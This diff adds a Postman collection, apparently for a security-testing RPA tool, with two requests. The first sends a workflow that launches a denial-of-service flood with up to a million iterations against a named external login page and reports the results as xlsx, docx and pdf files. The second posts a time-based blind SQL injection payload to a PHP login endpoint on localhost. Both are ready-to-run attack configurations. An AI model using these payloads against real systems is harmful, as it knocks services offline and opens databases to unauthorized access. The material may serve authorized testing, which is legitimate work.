@@ -1,0 +1,88 @@
+{
+	"info": {
+		"_postman_id": "8fb38cd4-3ece-4a5c-8610-3a665bfe4ba5",
+		"name": "RPA-V_Atlas",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "DDoS",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "authorization",
+						"type": "text",
+						"value": "123456"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"pid\": -1,\r\n    \"idPending\": -1,\r\n    \"commands\": [\r\n        {\r\n            \"id\": \"INIT\",\r\n            \"type\": \"get\",\r\n            \"command\": \"\",\r\n            \"properties\": [\r\n                \"http://prueba.atlasola.com.co/index.php/guard/login\"\r\n            ],\r\n            \"nextYes\": \"1\",\r\n            \"nextNo\": \"END\"\r\n        },\r\n        {\r\n            \"id\": \"1\",\r\n            \"type\": \"ddos\",\r\n            \"command\": \"http://prueba.atlasola.com.co/index.php/guard/login\",\r\n            \"properties\": [\r\n                \"D:\\\\tmp\\\\ddos\\\\rpa\\\\reporte.txt\",\r\n                \"0.5\",\r\n                \"15\",\r\n                \"-1\",\r\n                \"502\"\r\n            ],\r\n            \"nextYes\": \"END\",\r\n            \"nextNo\": \"END\"\r\n        },\r\n        {\r\n            \"id\": \"2\",\r\n            \"type\": \"ddos_report_xlsx\",\r\n            \"command\": \"D:\\\\tmp\\\\ddos\\\\rpa\\\\reporte.txt\",\r\n            \"properties\": [\r\n                \"fecha_inicio=true\",\r\n                \"fecha_fin=true\",\r\n                \"fechas_formato=dd/MMMM/yyyy h:mm aa\",\r\n                \"cant_solicitados=true\",\r\n                \"tiempo_solicitado=true\",\r\n                \"cant_realizados=true\",\r\n                \"cant_exitosos=true\",\r\n                \"detallado_hilos=true\"\r\n            ],\r\n            \"nextYes\": \"3\",\r\n            \"nextNo\": \"END\"\r\n        },\r\n        {\r\n            \"id\": \"3\",\r\n            \"type\": \"ddos_report_docx\",\r\n            \"command\": \"D:\\\\tmp\\\\ddos\\\\rpa\\\\reporte.txt\",\r\n            \"properties\": [\r\n                \"fecha_inicio=true\",\r\n                \"fecha_fin=true\",\r\n                \"fechas_formato=dd/MMMM/yyyy h:mm aa\",\r\n                \"cant_solicitados=true\",\r\n                \"tiempo_solicitado=true\",\r\n                \"cant_realizados=true\",\r\n                \"cant_exitosos=true\",\r\n                \"detallado_hilos=true\"\r\n            ],\r\n            \"nextYes\": \"4\",\r\n            \"nextNo\": \"END\"\r\n        },\r\n        {\r\n            \"id\": \"4\",\r\n            \"type\": \"ddos_report_pdf\",\r\n            \"command\": \"D:\\\\tmp\\\\ddos\\\\rpa\\\\reporte.txt\",\r\n            \"properties\": [\r\n                \"fecha_inicio=true\",\r\n                \"fecha_fin=true\",\r\n                \"fechas_formato=dd/MMMM/yyyy h:mm aa\",\r\n                \"cant_solicitados=false\",\r\n                \"tiempo_solicitado=true\",\r\n                \"cant_realizados=true\",\r\n                \"cant_exitosos=true\",\r\n                \"detallado_hilos=true\"\r\n            ],\r\n            \"nextYes\": \"END\",\r\n            \"nextNo\": \"END\"\r\n        }\r\n    ],\r\n    \"sendOutput\": true,\r\n    \"timeSleep\": \"50\",\r\n    \"driverLocation\": \"D:\\\\Usuario\\\\Documentos\\\\arq\\\\rpa2.0\\\\chromedriver88.exe\",\r\n    \"downloadLocation\": \"D:\\\\Usuario\\\\Documentos\\\\arq\\\\rpa2.0\\\\down\\\\\",\r\n    \"maxIterations\": \"1000000\"\r\n}",
+					"options": {
+						"raw": {
+							"language": "text"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://localhost:9090/execute/browser/run",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "9090",
+					"path": [
+						"execute",
+						"browser",
+						"run"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "SQLInjection-Example",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "formdata",
+					"formdata": [
+						{
+							"key": "sbPassword",
+							"value": "12",
+							"type": "text"
+						},
+						{
+							"key": "sbLogin",
+							"value": "Admin' and 1 -IF(MID(VERSION(),1,1) = '1', SLEEP(15), 0)#",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://localhost:8056/sirederepo/Controller/php/inicioSesion.php?action=ValidarUsuario",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8056",
+					"path": [
+						"sirederepo",
+						"Controller",
+						"php",
+						"inicioSesion.php"
+					],
+					"query": [
+						{
+							"key": "action",
+							"value": "ValidarUsuario"
+						}
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
